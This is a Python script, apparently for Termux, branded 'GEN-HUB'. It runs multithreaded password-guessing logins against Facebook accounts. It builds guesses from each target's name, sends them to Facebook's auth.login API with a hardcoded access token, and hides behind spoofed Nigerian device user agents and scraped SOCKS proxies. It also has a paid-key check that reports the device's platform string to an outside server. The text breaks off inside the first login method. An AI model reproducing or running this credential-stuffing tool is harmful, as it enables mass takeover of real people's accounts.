#------------->> IMPORT >>-------------#
try:
    import os
    import requests
    import json
    import time
    import re
    import random
    import sys  # This is the critical one!
    import uuid
    import mechanize
    import string
    import subprocess
    import bs4
    import urllib3
    import rich
    import base64
    import platform
    import httplib2
    import arrow
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
    from datetime import datetime
except ModuleNotFoundError as e:
    print(f'>> MISSING MODULE: {e}')
    print('>> INSTALLING MISSING MODULES....! ')
    # Try to install missing modules
    try:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "bs4", "rich", "urllib3", "httplib2", "arrow"])
        print('>> MODULES INSTALLED SUCCESSFULLY!')
        # Restart script
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except:
        print('>> FAILED TO INSTALL MODULES. PLEASE INSTALL MANUALLY:')
        print('>> pip install requests bs4 rich urllib3 httplib2 arrow')
        exit()

# Check if critical modules are imported
required_modules = ['sys', 'requests', 'bs4', 'tred', 'platform', 'httplib2', 'arrow']
for module in required_modules:
    if module not in dir():
        print(f'>> CRITICAL ERROR: {module} module not imported!')
        exit()

#------------->> KEY SYSTEM >>-------------#
def getKey():
    myid = str(os.getuid())
    myid = myid.upper()[::-1]
    n = re.findall("(\\d\\d)", myid)
    plat = platform.version()[2:][:8][::-1].upper() + platform.release()[3:][::-1].upper() + platform.version()[:2]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    return "GEN-" + myid + xp

def line():
    print('----------------------------------------------')

def subscription(message):
    clear()
    key = getKey()
    print(f"\033[1;97m [•] YOUR KEY   :  " + key)
    line()
    print(f'\033[1;97m [•] THIS TOOL IS PAID')
    print(f'\033[1;97m [•] YOU NEED TO APROVAL')
    line()
    xh = input(f'\033[1;97m [•] PRESS ENTER FOR SEND YOUR KEY')
    if xh in ["Trail", "trail"]:
        trk.append('Trail')
        On()
    clear()
    uname = input(f'\033[1;97m [•] ENTER YOUR NAME : ')
    tsk = "Hi Sir GEN! I Need To Aproval For Your Paid Tool So Please Approve My Key-:)\n\nName : " + uname + " \nKey : " + key
    subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+2348138189727&text=" + tsk])
    time.sleep(2)
    On()

trk = []

def On():
    try:
        clear()
        if "Trail" in trk:
            print(" Put Your Trail Key Bellow! ")
            line()
            key = input(' Put Key: ')
        else:
            key = getKey()
            
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'}
        params = {'key': key, 'device': platform.platform()}
        url = "https://itsngr.serv00.net/checkpzh.php"
        
        http_obj = httplib2.Http()
        response, content = http_obj.request(
            uri=url + "?" + "&".join([f"{k}={v}" for k, v in params.items()]),
            method="GET",
            headers=headers
        )
        
        response = content.decode('utf-8')
        if "error" in response:
            if "Key has expired" in response:  
                subscription("\033[1;97m [•] Your Key Has Been Expired! ")
            else:
                subscription("\033[1;97m [•] You're Not Premium User ")
        elif "user" in response:
            result = json.loads(response)
            try:
                name = result['name']
            except:
                name = '-'
            user = result['user']
            exp = result['expired']
            join = result['joined']
            
            # Calculate days remaining
            date_today = arrow.now().format('YYYY-MM-DD')
            a = arrow.get(date_today)
            b = arrow.get(exp)
            delta = (b - a).days
            
            # If key is valid, start the main menu
            Menu()
        else:
            On()
    except Exception as e:
        print(f"\033[1;97m [•] Error: {e}")
        time.sleep(1)
        exit()

#------------->> LOOP >>-------------#
loop=0;oks=[];cps=[];pcp=[];id=[];tokenku=[];user=[];plist=[];pookie=[];ugen=[]
#------------------[ DATE ]-----------------#
dateti = str(datetime.now()).split(' ')[0]
#------------->> GENE >>-------------#
def generate_wv_ua():
    # ----- Device info -----
    brands = {
        "Samsung": ["SM-A146P", "SM-M336B", "SM-A525F", "SM-G996B"],
        "Infinix": ["Infinix X688B", "Infinix X665C", "Infinix X683", "Infinix X671"],
        "Tecno": ["TECNO KG5p", "TECNO BD4j", "TECNO CH9n", "TECNO KF8"],
        "Xiaomi": ["Redmi Note 11", "Redmi Note 12", "Redmi 10C", "POCO M4 Pro"],
        "Oppo": ["CPH2127", "CPH2389", "CPH2457", "CPH2239"]
    }

    carriers = ["MTN", "Airtel", "Glo", "9mobile"]

    android_versions = ["12", "13", "14", "11"]
    chrome_version = "134.0.6998.170"

    # ----- Random picks -----
    brand = random.choice(list(brands.keys()))
    model = random.choice(brands[brand])
    carrier = random.choice(carriers)
    android_version = random.choice(android_versions)
    fbbv = random.randint(3412000, 3418000)   # Build version
    fbrv = random.randint(812345678, 912345682)

    width = random.choice([720, 1080])
    height = random.choice([1600, 2400])
    density = round(random.uniform(2.5, 3.0), 2)

    # ----- UA format -----
    ua = (
        f"Mozilla/5.0 (Linux; Android {android_version}; {model} Build/SP1A.210812.016; wv) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36 "
        f"[FB_IAB/FB4A;FBAV/506.1.0.74.27;IABMV/1;] "
        f"[FBAN/FB4A;FBAV/506.1.0.74.27;FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.katana;"
        f"FBLC/en_NG;FBCR/{carrier};FBMF/{brand};FBBD/{brand};FBDV/{model};FBSV/{android_version};"
        f"FBCA/arm64-v8a:armeabi-v7a;FBDM/{{density={density},width={width},height={height}}};]"
    )
    return ua

#------------->> USER AGENT FOR GRAPH & API >>-------------#
def ____U_A_1____():
	facebook_version = f"{random.randint(100, 450)}.0.0.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_ver_code = str(random.randint(10000000, 66666666))
	fbrv_ver_code = str(random.randint(0, 999999999))
	fblc_code = random.choice([
		'en_GB','en_US','es_LA','fr_FR','ar_AR','sv_SE','pt_BR','it_IT',
		'nl_NL','ru_RU','ro_RO','ko_KR','hr_HR','en_Qaau_US','cs_CZ',
		'de_DE','mk_MK','zh_HK','he_IL','uk_UA','lv_LV','el_GR','zh_TW',
		'nb_NO','en_US AT-T','en_NG'   # Nigeria locale added
	])
	
	# Nigeria phone brands/models
	tecno_model = random.choice(['Tecno Camon 17','Tecno Spark 7','Tecno Phantom X','Tecno Pouvoir 4'])
	infinix_model = random.choice(['Infinix Hot 10','Infinix Zero 8','Infinix Note 7','Infinix Smart 5'])
	itel_model = random.choice(['itel A56','itel P36','itel S16','itel Vision 1'])
	doogee_model = random.choice(['Doogee X9 Pro','Doogee N30','Doogee S88 Plus','Doogee X97 Pro'])
	blu_model = random.choice(['BLU R1 HD','F92 E 5G','Advance A5','Grand M3'])
	
	android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	fbdm_code = '{density=2.0,width=720,height=1440}'
	
	# Nigeria SIM names biased
	sim_name = random.choices(
		['MTN','Airtel','Glo','9mobile','Vodafone','Orange','T-Mobile','AT-T','Claro'],
		weights=[30,30,25,20,5,5,5,5,5], k=1
	)[0]
	
	# Nigeria brands biased
	brand = random.choices(
		["TECNO","Infinix","iTel","DOOGEE","Blu","Samsung","Huawei"],
		weights=[30,25,20,10,5,5,5], k=1
	)[0]
	
	# Nigeria models biased
	model = random.choice([tecno_model,infinix_model,itel_model,doogee_model,blu_model])
	
	uaa1 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fb_ver_code+';FBRV/'+fbrv_ver_code+';FBPN/com.facebook.katana;FBLC/'+fblc_code+';FBMF/'+brand+';FBBD/'+brand+';FBDV/'+model+';FBSV/'+android_version+';FBCA/armeabi-v8a:armeabi;FBDM/'+fbdm_code+';FB_FW/1;]'
	uaa2 = f'[FBAN/FB4A;FBAV/'+str(random.randint(10,100))+'.0.0.'+str(random.randint(1,8))+'.'+str(random.randint(40,150))+';FBBV/'+str(random.randint(4100000,4999999))+';[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fb_ver_code+';FBDM/'+fbdm_code+';FBLC/'+fblc_code+';FBRV/'+fbrv_ver_code+';FBCR/'+sim_name+';FBMF/'+brand+';FBBD/'+brand+';FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+';FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	return random.choice([uaa1,uaa2])


def ____U_A_2____():
	facebook_version = f"{random.randint(100, 450)}.0.0.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_ver_code = str(random.randint(10000000, 66666666))
	fbrv_ver_code = str(random.randint(0, 999999999))
	fblc_code = random.choice([
		'en_GB','en_US','es_LA','fr_FR','ar_AR','sv_SE','pt_BR','it_IT',
		'nl_NL','ru_RU','ro_RO','ko_KR','hr_HR','en_Qaau_US','cs_CZ',
		'de_DE','mk_MK','zh_HK','he_IL','uk_UA','lv_LV','el_GR','zh_TW',
		'nb_NO','en_US AT-T','en_NG'   # Nigeria locale added
	])
	
	# Nigeria phone brands/models
	tecno_model = random.choice(['Tecno Camon 17','Tecno Spark 7','Tecno Phantom X','Tecno Pouvoir 4'])
	infinix_model = random.choice(['Infinix Hot 10','Infinix Zero 8','Infinix Note 7','Infinix Smart 5'])
	itel_model = random.choice(['itel A56','itel P36','itel S16','itel Vision 1'])
	oppo_model = random.choice(['CPH1837','CPH1901','CPH1931','CPH1959'])
	realme_model = random.choice(['RMX1945','RMX2170','RMX2155','RMX3363'])
	
	android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	fbdm_code = '{density=2.0,width=720,height=1440}'
	
	# Nigeria SIM names biased
	sim_name = random.choices(
		['MTN','Airtel','Glo','9mobile','Vodafone','Orange','T-Mobile','AT-T','Claro'],
		weights=[30,30,25,20,5,5,5,5,5], k=1
	)[0]
	
	# Nigeria brands biased
	brand = random.choices(
		["TECNO","Infinix","iTel","OPPO","Realme","Samsung","Huawei"],
		weights=[30,25,20,10,10,5,5], k=1
	)[0]
	
	# Nigeria models biased
	model = random.choice([tecno_model,infinix_model,itel_model,oppo_model,realme_model])
	
	uaa1 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fb_ver_code+';FBRV/'+fbrv_ver_code+';FBPN/com.facebook.katana;FBLC/'+fblc_code+';FBMF/'+brand+';FBBD/'+brand+';FBDV/'+model+';FBSV/'+android_version+';FBCA/armeabi-v8a:armeabi;FBDM/'+fbdm_code+';FB_FW/1;]'
	uaa2 = f'[FBAN/FB4A;FBAV/'+str(random.randint(10,100))+'.0.0.'+str(random.randint(1,8))+'.'+str(random.randint(40,150))+';FBBV/'+str(random.randint(4100000,4999999))+';[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fb_ver_code+';FBDM/'+fbdm_code+';FBLC/'+fblc_code+';FBRV/'+fbrv_ver_code+';FBCR/'+sim_name+';FBMF/'+brand+';FBBD/'+brand+';FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+';FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	return random.choice([uaa1,uaa2])

def ____U_A_3____():
    # Current Facebook Android app user agent structure
    templates = [
        "Facebook Android 457.0.0.30.114 (Android 14; SM-A736B Build/UP1A.231005.007) [FBAN/FB4A;FBAV/457.0.0.30.114;FBBV/45700030114;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/457;FBCR/Android;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A736B;FBSV/14;FBOP/1;FBCA/arm64-v8a:;]",
        "Facebook Android 456.1.0.65.121 (Android 13; SM-G998B Build/TP1A.220624.014) [FBAN/FB4A;FBAV/456.1.0.65.121;FBBV/45601065121;FBDM/{density=3.5,width=1440,height=3200};FBLC/en_US;FBRV/456;FBCR/Android;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G998B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]",
        "Facebook Android 455.2.0.0.12.115 (Android 12; SM-N986B Build/SP1A.210812.016) [FBAN/FB4A;FBAV/455.2.0.0.12.115;FBBV/455200012115;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBRV/455;FBCR/Android;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N986B;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
    ]
    return random.choice(templates)
    
    #------------------[ DEVICE ]-----------------#
# Nigerian popular phone brands
xxxxx = ('TECNO', 'INFINIX', 'SAMSUNG', 'NOKIA', 'IPHONE', 'OPPO', 'VIVO', 'REALME', 'XIAOMI', 'HUAWEI', 'ITEL')
gtxx = ('TECNO', 'INFINIX', 'SAMSUNG', 'NOKIA', 'IPHONE', 'OPPO', 'VIVO', 'REALME', 'XIAOMI', 'HUAWEI', 'ITEL')
gt = ('TECNO', 'INFINIX', 'SAMSUNG', 'NOKIA', 'IPHONE', 'OPPO', 'VIVO', 'REALME', 'XIAOMI', 'HUAWEI', 'ITEL')

# Nigerian mobile models
nigeria_models = [
    # Tecno Models
    'TECNO-CAMON-19', 'TECNO-SPARK-10', 'TECNO-POP-7', 'TECNO-PHANTOM-X2', 
    'TECNO-CAMON-20', 'TECNO-SPARK-9', 'TECNO-POVA-4', 'TECNO-PHANTOM-V-FOLD',
    'TECNO-CAMON-18', 'TECNO-SPARK-8', 'TECNO-POVA-3', 'TECNO-PHANTOM-X',
    
    # Infinix Models
    'INFINIX-HOT-30', 'INFINIX-NOTE-30', 'INFINIX-ZERO-ULTRA', 'INFINIX-SMART-8',
    'INFINIX-HOT-20', 'INFINIX-NOTE-12', 'INFINIX-ZERO-X', 'INFINIX-SMART-7',
    'INFINIX-HOT-10', 'INFINIX-NOTE-11', 'INFINIX-ZERO-8', 'INFINIX-SMART-6',
    
    # Samsung Models (popular in Nigeria)
    'SAMSUNG-GALAXY-A14', 'SAMSUNG-GALAXY-A24', 'SAMSUNG-GALAXY-A54', 
    'SAMSUNG-GALAXY-S23', 'SAMSUNG-GALAXY-A04', 'SAMSUNG-GALAXY-A34',
    'SAMSUNG-GALAXY-M14', 'SAMSUNG-GALAXY-F14', 'SAMSUNG-GALAXY-A13',
    
    # Nokia Models
    'NOKIA-G21', 'NOKIA-C32', 'NOKIA-C22', 'NOKIA-G11', 'NOKIA-C12',
    'NOKIA-105', 'NOKIA-110', 'NOKIA-150', 'NOKIA-2720',
    
    # Other brands
    'OPPO-A78', 'OPPO-A58', 'OPPO-A38', 'OPPO-A18',
    'VIVO-Y36', 'VIVO-Y22', 'VIVO-Y16', 'VIVO-Y02',
    'REALME-C55', 'REALME-C35', 'REALME-C25', 'REALME-C11',
    'XIAOMI-REDMI-12', 'XIAOMI-REDMI-11', 'XIAOMI-REDMI-10', 'XIAOMI-REDMI-9',
    'HUAWEI-NOVA-Y91', 'HUAWEI-NOVA-11i', 'HUAWEI-Y70', 'HUAWEI-Y60',
    'ITEL-VISION-5', 'ITEL-P37', 'ITEL-S18', 'ITEL-A58'
]
#------------------[ WEB ]-----------------#
fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
#------------------[ INSTALL ]-----------------#
os.system('pkg install sox -y')
os.system('pkg install espeak')
#os.system('clear');os.system('espeak -a 300 "well,come to,Tutul, King tools script send by kalyan king boos"')
#------------------[ PROXY ]-----------------#
proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('socksku.txt', 'w').write(proxylist)
proxsi = open('socksku.txt', 'r').read().splitlines()
#------------------[ DATE-CHECKER ]-----------------#
def tutulx(fx):
    if len(fx) == 15:
        if fx[:10] in ['1000000000']:
            tutulxz = '2009'
            return tutulxz
        if fx[:9] in ['100000000']:
            tutulxz = '2009'
            return tutulxz
        if fx[:8] in ['10000000']:
            tutulxz = '2009'
            return tutulxz
        if fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            tutulxz = '2009'
            return tutulxz
        if fx[:7] in ['1000006', '1000007', '1000008', '1000009']:
            tutulxz = '2010'
            return tutulxz
        if fx[:6] in ['100001']:
            tutulxz = '2010/2011'
            return tutulxz
        if fx[:6] in ['100002', '100003']:
            tutulxz = '2011/2012'
            return tutulxz
        if fx[:6] in ['100004']:
            tutulxz = '2012/2013'
            return tutulxz
        if fx[:6] in ['100005', '100006']:
            tutulxz = '2013/2014'
            return tutulxz
        if fx[:6] in ['100007', '100008']:
            tutulxz = '2014/2015'
            return tutulxz
        if fx[:6] in ['100009']:
            tutulxz = '2015'
            return tutulxz
        if fx[:5] in ['10001']:
            tutulxz = '2015/2016'
            return tutulxz
        if fx[:5] in ['10002']:
            tutulxz = '2016/2017'
            return tutulxz
        if fx[:5] in ['10003']:
            tutulxz = '2018/2019'
            return tutulxz
        if fx[:5] in ['10004']:
            tutulxz = '2019'
            return tutulxz
        if fx[:5] in ['10005']:
            tutulxz = '2020'
            return tutulxz
        if fx[:5] in ['10006', '10007', '10008']:
            tutulxz = '2021/2022'
            return tutulxz
        tutulxz = '2023'
        return tutulxz
    if len(fx) in [9, 10]:
        tutulxz = '2008/2009'
        return tutulxz
    if len(fx) == 8:
        tutulxz = '2007/2008'
        return tutulxz
    if len(fx) == 7:
        tutulxz = '2006/2007'
        return tutulxz
    tutulxz = '2023/2024'
    return tutulxz

#------------------[ NIGERIAN USER AGENT GENERATOR ]-----------------#
def generate_nigerian_ua():
    brands = ['TECNO', 'INFINIX', 'SAMSUNG', 'NOKIA', 'ITEL']
    brand = random.choice(brands)
    
    if brand == 'TECNO':
        models = ['CAMON-19', 'SPARK-10', 'POP-7', 'PHANTOM-X2', 'CAMON-20', 'SPARK-9']
        android_versions = ['10', '11', '12', '13']
        build_prefixes = ['RKQ1', 'SP1A', 'TP1A', 'UP1A']
    elif brand == 'INFINIX':
        models = ['HOT-30', 'NOTE-30', 'ZERO-ULTRA', 'SMART-8', 'HOT-20', 'NOTE-12']
        android_versions = ['10', '11', '12', '13']
        build_prefixes = ['RKQ1', 'SP1A', 'TP1A', 'UP1A']
    elif brand == 'SAMSUNG':
        models = ['SM-A146F', 'SM-A245F', 'SM-A346E', 'SM-A546E', 'SM-G781B']
        android_versions = ['11', '12', '13', '14']
        build_prefixes = ['RP1A', 'SP1A', 'TP1A', 'UP1A']
    elif brand == 'NOKIA':
        models = ['NOKIA-8.3', 'NOKIA-G50', 'NOKIA-X30', 'NOKIA-G21']
        android_versions = ['11', '12', '13']
        build_prefixes = ['00WW', 'V3.']
    else:  # ITEL
        models = ['VISION-5', 'P37', 'S18', 'A58']
        android_versions = ['10', '11', '12']
        build_prefixes = ['RKQ1', 'SP1A']
    
    model = random.choice(models)
    android = random.choice(android_versions)
    build = f"{random.choice(build_prefixes)}.{random.randint(100, 999)}.{random.randint(100, 999)}"
    chrome_version = f"{random.randint(100, 120)}.0.{random.randint(1000, 9999)}.{random.randint(100, 999)}"
    
    # Nigerian mobile carriers
    carriers = ['MTN', 'AIRTEL', 'GLO', '9MOBILE']
    carrier = random.choice(carriers)
    
    ua = f"Mozilla/5.0 (Linux; Android {android}; {brand} {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.0.0.00.000;FBBV/39100000000;FBCR/{carrier};FBLC/en_NG;FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{brand} {model};FBSV/{android};FBOP/1;FBCA/arm64-v8a:;]"
    
    return ua

#------------->> SYS PRO >>-------------#
sys.stdout.write('\x1b]2; GEN-HUB\x07')
#------------------[ COLOR ]-----------------#
B = '\x1b[10;90m';R = '\x1b[10;91m';G = '\x1b[10;92m';H = '\x1b[10;93m';BL = '\x1b[10;94m';BG = '\x1b[10;95m';S = '\x1b[10;96m';W = '\x1b[10;97m';EX = '\x1b[0m';E = '\x1b[m'
#------------------[ SYTLE ]-----------------#
dt = '•'
#------------->> COLOUR >>-------------#
gx="\033[1;32m";wx="\x1b[1;97m";rx="\x1b[38;5;160m";cx="\x1b[1;96m";yx="\x1b[1;93m";bx='\x1b[1;90m'
#------------->> STYLE >>-------------#
xd=f"{bx}[{wx}~{bx}]{gx}";xd1=f"{bx}[{wx}1{bx}]{gx}";xd2=f"{bx}[{wx}2{bx}]{gx}";xd3=f"{bx}[{wx}3{bx}]{gx}";xd4=f"{bx}[{wx}4{bx}]{gx}";xd5=f"{bx}[{wx}5{bx}]{gx}";xd6=f"{bx}[{wx}6{bx}]{gx}";xd7=f"{bx}[{wx}7{bx}]{gx}";xd8=f"{bx}[{wx}8{bx}]{gx}";xd9=f"{bx}[{wx}9{bx}]{gx}";xd10=f"{bx}[{wx}10{bx}]{gx}";xd11=f"{bx}[{wx}11{bx}]{gx}";xd12=f"{bx}[{wx}12{bx}]{gx}";xd13=f"{bx}[{wx}13{bx}]{gx}";xd14=f"{bx}[{wx}14{bx}]{gx}";xd0=f"{bx}[{wx}0{bx}]{gx}";xdx=f"{bx}[{wx}?{bx}]{gx}"
#------------->> LOGO >>-------------#
os.system('xdg-open https://chat.whatsapp.com/F3IhtLI7duf4pMkhhXJSfd?mode=ems_copy_t')
logo = f'''
    {gx}░██████╗{wx}░███████╗{gx}███╗░░██╗
    {gx}██╔════╝{wx}░██╔════╝{gx}████╗░██║ {bx}|{gx} OWNER{bx}:{gx} MYSTERY
    {gx}██║░░██╗{wx}░█████╗{gx}░░██╔██╗██║
    {gx}██║░░╚██╗{wx}██╔══╝{gx}░░██║╚████║ {bx}|{gx} STATUS  {bx}:{gx} PREMIUM
    {gx}╚██████╔╝{wx}███████╗{gx}██║░╚███║
    {gx}░╚═════╝{wx}░╚══════╝{gx}╚═╝░░╚══╝ {bx}|{gx} VERSION  {bx}:{wx} 0.6
{wx}{47*'-'}
       {gx}TOOLS {bx}|{wx}FILE{bx}|{wx}RANDOM{bx}|{wx}OLD{bx}| {gx}CLONE
{wx}{47*'-'}'''
#------------->> CLEAR PRO >>-------------#
def clear():os.system('clear');print(logo)
def linex():print(f"{wx}{47*'-'}")

#------------->> MAIN MENU >>-------------#
def Menu():
    clear();print(f'{xd1} START FILE CLONING ');print(f'{xd2} START RANDOM {wx}ALL{gx} COUNTRY CLONING ');print(f'{xd3} START OLD CLONING ');print(f'{xd0} EXIT ALL CLONING ');linex();___O_P___ = input(f'{xdx} SELECTION {bx}:{wx} ')
    if ___O_P___ in ['1']:____F_I_L_E____()
    elif ___O_P___ in ['2']:____R_A_N_D_O_M____()
    elif ___O_P___ in ['3']:____O_L_D____()
    elif ___O_P___ in ['0']:exit()
    else:linex();print(f'{xd}{rx} WRONG OPTION SELECTION ');time.sleep(3);Menu()

#------------->> FILE MAIN MENU >>-------------#
def ____F_I_L_E____():
    clear();print(f'{xd} EXAMPLE {bx}:{gx} /sdcard/filename.txt ');linex();filepro = input(f'{xd} ENTER FILE NAME {bx}:{wx} ')
    try:
          fo = open(filepro,'r').read().splitlines()
    except FileNotFoundError:linex();print(f'{xd}{rx} FILE NOT FOUND ');time.sleep(3);____F_I_L_E____()
    clear()
    print(f'{xd1} METHOD {wx}~{gx} M1');print(f'{xd2} METHOD {wx}~{gx} M2');print(f'{xd3} METHOD {wx}~{gx} M3')
    print(f'{xd4} METHOD {wx}~{gx} M4');print(f'{xd5} METHOD {wx}~{gx} M5');print(f'{xd6} METHOD {wx}~{gx} M6')
    print(f'{xd7} METHOD {wx}~{gx} M7 (ADS MANAGER)');print(f'{xd8} METHOD {wx}~{gx} M8 (KATANA)')
    print(f'{xd9} METHOD {wx}~{gx} M9 (FACEBOOK LITE)');print(f'{xd10} METHOD {wx}~{gx} M10 (LEGACY API)')
    print(f'{xd11} METHOD {wx}~{gx} M11 (WORKPLACE)');print(f'{xd12} METHOD {wx}~{gx} M12 (INSTAGRAM CROSS)')
    print(f'{xd13} METHOD {wx}~{gx} M13 (FREE BASICS)');print(f'{xd14} METHOD {wx}~{gx} M14 (FACEBOOK GAMING)')
    linex();___M_E_T_H_O_D___ = input(f'{xd} ENTER METHOD {bx}:{wx} ')
    
    try:
          clear();print(f'{xd} EXAMPLE BD {bx}:{gx} 10{bx}|{gx}15{bx}|{gx}20{bx}|{gx}25');print(f'{xd} EXAMPLE OTHERS {bx}:{gx} 5{bx}|{gx}10{bx}|{gx}15{bx}|{gx}20');linex()
          ps_limit = int(input(f'{xdx} PASSWORDS ADD LIMIT {bx}:{wx} '))
    except:ps_limit = 5
    clear();print(f'{xd} EXAMPLE {bx}:{gx} firstlast {bx}|{gx} first123 {bx}|{gx} first@@ ');linex()
    for i in range(ps_limit):
           plist.append(input(f'{xd} ENTER PASSWORD NO {wx}{i+1} {bx}:{wx} '))
    clear();___C_P___ = input(f'{xd} DO YOU WENT SHOW CP UID {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    if ___C_P___ in ['y','Y','yes','Yes','1']:pcp.append('y')
    else:pcp.append('n')
    with tred(max_workers=35) as ___H_U_B___:
            clear();total_ids = str(len(fo))
            print(f'{xd} TOTAL UID{bx}|{gx}METHOD {bx}:{wx} {total_ids}{bx}|{wx}M{___M_E_T_H_O_D___} ');print(f'{xd} TODAYS DATE   {wx}: {dateti} ');print(f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}2{gx} MINUTES ');linex()
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if ___M_E_T_H_O_D___ in ['1']:___H_U_B___.submit(___M_T_H_D_1___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['2']:___H_U_B___.submit(___M_T_H_D_2___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['3']:___H_U_B___.submit(___M_T_H_D_3___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['4']:___H_U_B___.submit(___M_T_H_D_4___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['5']:___H_U_B___.submit(___M_T_H_D_5___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['6']:___H_U_B___.submit(___M_T_H_D_6___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['7']:___H_U_B___.submit(___M_T_H_D_7___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['8']:___H_U_B___.submit(___M_T_H_D_8___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['9']:___H_U_B___.submit(___M_T_H_D_9___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['10']:___H_U_B___.submit(___M_T_H_D_10___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['11']:___H_U_B___.submit(___M_T_H_D_11___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['12']:___H_U_B___.submit(___M_T_H_D_12___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['13']:___H_U_B___.submit(___M_T_H_D_13___,ids,names,passlist)
                elif ___M_E_T_H_O_D___ in ['14']:___H_U_B___.submit(___M_T_H_D_14___,ids,names,passlist)
    print(f"\n{wx}{47*'-'}");print(f'{xd} THE PROCESS HAS COMPLETED');print(f"{xd} TOTAL OK IDS {bx}:{gx} {len(oks)}");print(f"{xd} TOTAL CP IDS {bx}:\x1b[38;5;205m {len(cps)}");print(f"{wx}{47*'-'}");exit()

#------------->> FILE METHOD M1 B-GRAPH >>-------------#
def ___M_T_H_D_1___(ids,names,passlist):
        try:
                global loop,oks,cps
                xp=f"{bx}[{gx}MR{bx}]{gx}"
                sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
